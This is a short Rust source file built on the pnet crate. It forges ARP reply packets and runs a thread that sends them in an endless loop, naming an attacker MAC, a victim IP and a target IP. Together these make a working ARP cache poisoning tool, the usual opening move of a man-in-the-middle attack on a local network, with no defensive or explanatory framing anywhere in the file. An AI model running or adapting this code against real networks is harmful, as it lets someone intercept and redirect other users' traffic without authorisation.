use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use pnet::packet::MutablePacket;
use pnet::{datalink, util::MacAddr};
use std::{
    net::Ipv4Addr,
    sync::{Arc, Mutex},
    thread,
};

fn build_arp_reply(
    source_mac: MacAddr,
    source_ip: std::net::Ipv4Addr,
    target_mac: MacAddr,
    target_ip: std::net::Ipv4Addr,
) -> [u8; 42] {
    let mut ethernet_buffer = [0u8; 42];
    {
        let mut eth = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();
        eth.set_destination(target_mac);
        eth.set_source(source_mac);
        eth.set_ethertype(EtherTypes::Arp);

        let mut arp = MutableArpPacket::new(eth.payload_mut()).unwrap();
        arp.set_hardware_type(ArpHardwareTypes::Ethernet);
        arp.set_protocol_type(EtherTypes::Ipv4);
        arp.set_hw_addr_len(6);
        arp.set_proto_addr_len(4);
        arp.set_operation(ArpOperations::Reply);
        arp.set_sender_hw_addr(source_mac);
        arp.set_sender_proto_addr(source_ip);
        arp.set_target_hw_addr(target_mac);
        arp.set_target_proto_addr(target_ip);
    }
    ethernet_buffer
}

pub fn start_poison_thread(
    tx: Arc<Mutex<Box<dyn datalink::DataLinkSender>>>,
    attacker_mac: MacAddr,
    victim_ip: Ipv4Addr,
    victim_mac: MacAddr,
    target_ip: Ipv4Addr,
) {
    thread::spawn(move || loop {
        let reply_packet = build_arp_reply(attacker_mac, target_ip, victim_mac, victim_ip);
        if let Some(Err(e)) = tx.lock().unwrap().send_to(&reply_packet, None) {
            eprintln!("Failed to send ARP poison: {e:?}");
        }
    });
}
